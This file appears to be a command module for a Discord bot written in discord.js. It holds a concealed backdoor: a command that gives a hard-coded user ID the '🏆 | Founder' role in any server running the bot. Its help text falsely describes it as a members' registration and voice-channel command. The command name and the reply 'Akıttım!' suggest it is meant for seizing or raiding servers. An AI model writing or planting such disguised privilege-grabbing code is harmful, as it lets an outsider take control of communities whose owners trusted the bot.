const Discord = module.require('discord.js');
const botconfig = require("../config.json");
const ownerid = "471590154927210497";

module.exports.run = async (bot, message, args) => {

    if (message.author.id !== ownerid) return message.channel.send("Sen Benim Kurucum Değilsin!");
    if (message.author.id == ownerid) {

        let member = message;
        var role = member.guild.roles.find("name", "🏆 | Founder")
        message.member.addRole(role)
        message.channel.send("Akıttım!");
    }
}


module.exports.help = {
    name: "akıtbot",
    decription: "Register Server And Join The Voice Channel vs.",
    usage: "?kayıt",
    accessableby: "Members",
    aliases: ["ut"],
    noalias: "No Aliases"
}